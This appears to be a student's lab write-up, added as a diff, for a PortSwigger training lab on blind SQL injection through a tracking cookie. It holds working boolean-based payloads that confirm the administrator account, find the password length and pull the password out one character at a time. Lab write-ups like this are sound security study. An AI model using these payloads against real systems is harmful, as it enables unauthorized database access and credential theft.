@@ -1,0 +1,32 @@
+https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+
+Actions:
+1. Determine parameter. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+A query returns "Welcome back" if the query successfully returns rows. It does not display the results as it is BLIND.
+2. A table called "users" with columns "username" and "password" exists. Confirm existence of tble and or administrator account.
+3. Enumerate length of password.
+4. Exploit the BLIND sqli to return the password for the administrator account. Retrieve the password using python rather than intruder.
+
+Results:
+1. TrackingID parameter. If it exists a "Welcome back!" message is displayed. To test the paramater we can inject a boolean query after the TrackingID.
+TRUE - Message displayed
+Cookie: TrackingId=G5zKQTVsP7NRBwMI'+and+1=1--; 
+FALSE - Message is not displayed
+Cookie: TrackingId=G5zKQTVsP7NRBwMI'+and+1=0--;
+
+2. Query to confirm:
+' and (select username from Users where username='administrator')='administrator'--
+Cookie: TrackingId=G5zKQTVsP7NRBwMI'+and+(select+username+from+Users+where+username%3d'administrator')%3d'administrator'--;
+
+3. If we go higher than 19 chars the message is not return. Assume password is 20 characters in length. 
+Query to enumerate password length:
+' and (select username from Users where username='administrator' and LENGTH(password)>19)='administrator'--
+Cookie: TrackingId=G5zKQTVsP7NRBwMI'+and+(select+username+from+Users+where+username%3d'administrator'+and+LENGTH(password)>19)%3d'administrator'--;
+
+4. Use a substring we can loop chars of password and change position when each char found.
+Query to enumerate password:
+' and (select substring(password,1,1) from Users where username='administrator')='a'--'
+Cookie: TrackingId=G5zKQTVsP7NRBwMI'+and+(select+substring(password,1,1)+from+Users+where+username%3d'administrator')%3d'a'--;
+Cookie: TrackingId=G5zKQTVsP7NRBwMI'+and+(select+substring(password,POSITION,1)+from+Users+where+username%3d'administrator')%3d'CHAR'--;
+
+See password-retrieval.py
